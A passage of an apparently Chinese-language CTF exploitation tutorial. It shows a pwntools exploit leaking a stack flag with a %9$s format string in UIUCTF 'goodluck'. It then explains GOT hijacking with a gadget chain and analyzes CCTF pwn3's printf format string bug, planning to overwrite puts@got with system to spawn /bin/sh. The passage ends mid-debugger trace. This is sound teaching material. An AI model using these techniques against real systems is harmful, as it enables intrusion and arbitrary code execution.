class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x7ffff7a46fd4</span> &lt;<span class="built_in">printf</span>+<span class="number">100</span>&gt;    mov    qword ptr [rsp + <span class="number">0x18</span>], rax</span><br><span class="line">   <span class="number">0x7ffff7a46fd9</span> &lt;<span class="built_in">printf</span>+<span class="number">105</span>&gt;    <span class="keyword">xor</span>    eax, eax</span><br><span class="line">   <span class="number">0x7ffff7a46fdb</span> &lt;<span class="built_in">printf</span>+<span class="number">107</span>&gt;    lea    rax, [rsp + <span class="number">0xe0</span>]</span><br><span class="line">───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdef8</span> —▸ <span class="number">0x400890</span> (main+<span class="number">234</span>) ◂— mov    edi, <span class="number">0x4009b8</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdf00</span> ◂— <span class="number">0x31000001</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdf08</span> —▸ <span class="number">0x602cb0</span> ◂— <span class="string">&#x27;12345678&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdf10</span> —▸ <span class="number">0x602260</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdf18</span> —▸ <span class="number">0x7fffffffdf20</span> ◂— <span class="string">&#x27;flag&#123;11111111111111111&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdf20</span> ◂— <span class="string">&#x27;flag&#123;11111111111111111&#x27;</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdf28</span> ◂— <span class="string">&#x27;11111111111111&#x27;</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdf30</span> ◂— <span class="number">0x313131313131</span> <span class="comment">/* &#x27;111111&#x27; */</span></span><br><span class="line">─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7f</span>fff7a46f70 <span class="built_in">printf</span></span><br><span class="line">   f <span class="number">1</span>           <span class="number">400890</span> main+<span class="number">234</span></span><br><span class="line">   f <span class="number">2</span>     <span class="number">7f</span>fff7a03bf7 __libc_start_main+<span class="number">231</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以看到flag在栈上偏移为4， x64 前 6 个参数存在寄存器上面，而第一个参数又是格式化字符串</p><p>所以是第9个参数，payload ：%9$s</p><p>Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">goodluck = ELF(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%9$s&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hacker@ubuntu:~/Desktop/<span class="number">2017</span>-UIUCTF-pwn200-GoodLuck$ python <span class="built_in">exp</span>.py </span><br><span class="line">[*] <span class="string">&#x27;/home/hacker/Desktop/2017-UIUCTF-pwn200-GoodLuck/goodluck&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br><span class="line"><span class="function">[+] Starting local process &#x27;./goodluck&#x27;: pid 15774</span></span><br><span class="line"><span class="function">%9$s</span></span><br><span class="line"><span class="function">[*] Process &#x27;./goodluck&#x27; stopped with <span class="built_in">exit</span> code 0 <span class="params">(pid <span class="number">15774</span>)</span></span></span><br><span class="line"><span class="function">what&#x27;s the flag</span></span><br><span class="line"><span class="function">You answered:</span></span><br><span class="line"><span class="function">flag</span>&#123;<span class="number">111111111111111</span>&#125;</span><br><span class="line"></span><br><span class="line">But that was totally wrong lol get rekt</span><br></pre></td></tr></table></figure><h2 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>目前的 ELF 编译系统使用一种成为延迟绑定( lazy binding )的技术来实现对共享库中函数的调用过程。该机制主要通过两个数据结构 GOT 和 过程链接表( Procedure Linkage Table , PLT )实现。其简化的原理为 : 当目标模块存在一个外部共享库的函数调用时，其在汇编层面使用 call 指令实现调用，其作用为跳转至对应函数的 PLT 表项处执行，该表项的第一条指令为 jmp *[ 对应 GOT 项的地址 ]，第一次执行函数调用时，通过 GOT 与 PLT 的合作，会将最终调用函数的地址确定下来，并存放在其对应的 GOT 表项中。当后续再发生调用时， jmp *[ 对应 GOT 项的地址 ] 指令即表示直接跳转至目标函数处执行。</p><p>在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有开启 RELRO 保护时，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p><p>假设我们需要将函数A的地址覆盖为函数B的地址，那么步骤如下：</p><ol><li><p>确定函数A的GOT表地址</p></li><li><p>确定函数B的地址</p><p>在这一步，需要我们自己想办法来泄露对应函数 B 的地址。</p></li><li><p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p><ul><li>使用write函数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop eax; ret;           # printf@got -&gt; eax</span><br><span class="line">pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx</span><br><span class="line">add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</span><br></pre></td></tr></table></figure><ul><li>格式化字符串任意地址写</li></ul></li></ol><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>使用的是2016 CCTF中的pwn3</p><p>首先查看保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hacker@ubuntu:~/Desktop/2016-CCTF-pwn3$ checksec pwn3</span><br><span class="line">[*] &#x27;/home/hacker/Desktop/2016-CCTF-pwn3/pwn3&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>开了NX。</p><p>main()：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+14h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  ask_username(&amp;s1);</span><br><span class="line">  ask_password(&amp;s1);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      print_prompt();</span><br><span class="line">      v3 = get_command();</span><br><span class="line">      v5 = v3;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      put_file();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      show_dir();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      get_file();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ask_username():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">ask_username</span><span class="params">(<span class="keyword">char</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">40</span>]; <span class="comment">// [esp+14h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Connected to ftp.hacker.server&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;220 Serv-U FTP Server v6.4 for WinSock ready...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name (ftp.hacker.server:Rainism):&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%40s&quot;</span>, src);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">39</span> &amp;&amp; src[i]; ++i )</span><br><span class="line">    ++src[i];</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对输入的每一位进行了+1的操作。</p><p>ask_password()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">ask_password</span><span class="params">(<span class="keyword">char</span> *s1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;sysbdmin&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;who you are?&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;welcome!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>操作之后的需要与sysbdmin相同。</p><p>get_command()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">get_command</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%3s&quot;</span>, &amp;s1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s1, <span class="string">&quot;get&quot;</span>, <span class="number">3u</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s1, <span class="string">&quot;put&quot;</span>, <span class="number">3u</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s1, <span class="string">&quot;dir&quot;</span>, <span class="number">3u</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>put_file()：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *<span class="title">put_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// ST1C_4</span></span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">0xF4</span>u);<span class="comment">//244</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please enter the name of the file you want to upload:&quot;</span>);</span><br><span class="line">  get_input(v0, <span class="number">40</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;then, enter the content:&quot;</span>);</span><br><span class="line">  get_input(v0 + <span class="number">10</span>, <span class="number">200</span>, <span class="number">1</span>);</span><br><span class="line">  v0[<span class="number">60</span>] = file_head;</span><br><span class="line">  result = v0;</span><br><span class="line">  file_head = (<span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc后调用两次get_input()函数，并在最后的 4 个字节内写入上一块调用 put_file 时获得的地址，然后更新头指针 file_head 并返回本次分配的空间的起始地址。</p><p>也就是说，每次调用put_file()，分配244字节大小的空间，前40字节保存文件名，后200保存文件内容，最后四个字节保存上一块内存的地址，file_head是bss段上的变量，所以值为0，这样就在栈上得到一条链。</p><p>get_input()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __cdecl <span class="title">get_input</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (_BYTE *)(v5 + a1);</span><br><span class="line">    result = fread((<span class="keyword">void</span> *)(v5 + a1), <span class="number">1u</span>, <span class="number">1u</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( result &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v4 == <span class="number">10</span> &amp;&amp; a3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v5 + a1;</span><br><span class="line">        *v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = ++v5;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt;= a2 )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数在遇到回车符号或达到最大输入量（第二个参数）前，会一直向第一个参数指定的缓冲区中写入输入的内容.</p><p>show_dir()：函数遍历前面利用 put_file 得到的链栈，并依次将它们的名字复制到大小为 1024 个字节的缓冲区中，然后输出缓冲区的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show_dir</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+14h] [ebp-414h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+414h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+418h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+41Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  bzero(s, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = file_head; i; i = *(_DWORD *)(i + <span class="number">240</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; *(_BYTE *)(i + j); ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = v5++;</span><br><span class="line">      s[v0] = *(_BYTE *)(i + j);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_file()：存在漏洞的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+1Ch] [ebp-FCh]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+E4h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;enter the file name you want to get:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%40s&quot;</span>, &amp;s1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s1, <span class="string">&quot;flag&quot;</span>, <span class="number">4u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;too young, too simple&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = (<span class="keyword">char</span> *)file_head; i; i = (<span class="keyword">char</span> *)*((_DWORD *)i + <span class="number">60</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(i, &amp;s1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;dest, i + <span class="number">40</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;dest);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据用户输入的文件名到链栈中去寻找，如果有同名的文件那么输出内容，但是因为最后将文件的内容直接 printf 出来，所以存在 <strong>格式化字符串漏洞</strong>。</p><p>将文件内容put到文件中后，调用get_file将文件内容读取出来，存在格式化字符串漏洞，可以达到信息泄露和任意地址写。</p><ol><li>利用格式化字符串的任意写，将show_dir()函数调用的put函数在got.plt表中的地址改为system的地址</li><li>将show_dir()所显示的文件名内容设成/bin/sh</li></ol><p>完成上面两步后，就可以在运行show_dir()时将puts(“/bin/sh”)变为system(“”/bin/sh”)</p><p>第二步比较简单，主要是第一步。</p><p>不知道system函数的地址，因为我们不知道动态链接后libc的基址，这首先需要将这个信息泄露</p><p>我们先在printf的地址下断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:08048895 loc_8048895:                            ; CODE XREF: get_file+8B↑j</span><br><span class="line">.text:08048895                 lea     eax, [ebp+dest]</span><br><span class="line">.text:0804889B                 mov     [esp], eax      ; format</span><br><span class="line">.text:0804889E                 call    _printf</span><br><span class="line">.text:080488A3                 leave</span><br><span class="line">.text:080488A4                 retn</span><br><span class="line">.text:080488A4 get_file        endp</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/yutao/ctf-challenges/pwn/fmtstr/<span class="number">2016</span>-CCTF-pwn3/pwn3 </span><br><span class="line">Connected to ftp.hacker.server</span><br><span class="line"><span class="number">220</span> Serv-U FTP Server v6<span class="number">.4</span> <span class="keyword">for</span> WinSock ready...</span><br><span class="line">Name (ftp.hacker.server:Rainism):rxraclhm</span><br><span class="line">welcome!</span><br><span class="line">ftp&gt;put </span><br><span class="line">please enter the name of the file you want to upload:namename</span><br><span class="line">then, enter the content:qwerqwer</span><br><span class="line">ftp&gt;get</span><br><span class="line">enter the file name you want to get:namename</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x0804889e</span> <span class="function">in <span class="title">get_file</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span></span><br><span class="line"><span class="function">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span></span><br><span class="line"><span class="function"> EAX  0xffffcedc ◂— &#x27;qwerqwer&#x27;</span></span><br><span class="line"><span class="function"> EBX  0x0</span></span><br><span class="line"><span class="function"> ECX  0x804b598 ◂— &#x27;qwerqwer&#x27;</span></span><br><span class="line"><span class="function"> EDX  0xffffcedc ◂— &#x27;qwerqwer&#x27;</span></span><br><span class="line"><span class="function"> EDI  0x0</span></span><br><span class="line"><span class="function"> ESI  0<span class="title">xf7fb6000</span> <span class="params">(_GLOBAL_OFFSET_TABLE_)</span> ◂— 0x1d7d8c</span></span><br><span class="line"><span class="function"> EBP  0xffffcfd8 —▸ 0xffffd028 ◂— 0x0</span></span><br><span class="line"><span class="function"> ESP  0xffffcec0 —▸ 0xffffcedc ◂— &#x27;qwerqwer&#x27;</span></span><br><span class="line"><span class="function"> EIP  0<span class="title">x804889e</span> <span class="params">(get_file+<span class="number">168</span>)</span> —▸ 0xfffc1de8 ◂— 0xfffc1de8</span></span><br><span class="line"><span class="function">───────────────────────────────────[ DISASM ]───────────────────────────────────</span></span><br><span class="line"><span class="function"> ► 0x804889e &lt;get_file+168&gt;      call   <span class="built_in">printf</span>@plt &lt;<span class="built_in">printf</span>@plt&gt;</span></span><br><span class="line"><span class="function">        format: 0xffffcedc ◂— &#x27;qwerqwer&#x27;</span></span><br><span class="line"><span class="function">        vararg: 0x804b598 ◂— &#x27;qwerqwer&#x27;</span></span><br><span class="line"><span 